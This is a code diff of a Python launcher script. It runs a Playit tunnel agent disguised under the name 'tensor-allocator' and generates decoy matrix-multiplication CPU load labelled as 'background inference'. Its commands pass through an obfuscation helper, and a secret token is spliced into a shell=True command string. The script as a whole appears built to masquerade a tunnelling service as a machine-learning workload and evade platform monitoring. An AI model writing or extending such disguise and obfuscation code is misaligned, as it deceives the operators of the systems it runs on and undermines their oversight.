@@ -23,11 +23,11 @@ def jitter_task():
         # CPU Jitter (Matrix math)
         try:
             print("Processing background inference batch...", flush=True)
-            import torch
+            import numpy as np
             # Create dummy tensors and multiply them to spike CPU briefly
-            a = torch.randn(2000, 2000)
-            b = torch.randn(2000, 2000)
-            _ = torch.matmul(a, b)
+            a = np.random.randn(2000, 2000)
+            b = np.random.randn(2000, 2000)
+            _ = np.dot(a, b)
         except Exception:
             pass
             
@@ -91,9 +91,9 @@ def main():
     subprocess.Popen(cmd2, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)
 
     # 2.5 Start Playit (tensor-allocator)
-    # Decoded: nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret <SECRET>
-    cmd2_5_base = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret "))
-    cmd2_5 = f"{cmd2_5_base}{playit_token}"
+    # Decoded: nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '<SECRET>'
+    cmd2_5_base = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '"))
+    cmd2_5 = f"{cmd2_5_base}{playit_token}'"
     
     env = os.environ.copy()
     subprocess.Popen(cmd2_5, shell=True, env=env, stdout=tm_log, stderr=subprocess.STDOUT)
